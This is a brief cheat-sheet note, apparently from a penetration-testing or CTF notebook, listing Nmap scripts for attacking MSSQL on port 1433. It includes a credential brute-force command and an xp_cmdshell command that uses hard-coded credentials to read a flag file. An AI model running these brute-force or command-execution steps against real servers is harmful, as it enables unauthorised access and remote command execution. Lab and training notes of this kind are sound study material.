---
up: "[[SQL]]"
---

# MSSQL Nmap Scripts

Port 1433 is default port.

```bash
nmap <ip> -p 1433 --script ms-sql-info
nmap <ip> -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
nmap <ip> -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt
nmap <ip> -p 1433 --script ms-sql-empty-password
```

```bash
nmap <ip> -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
```
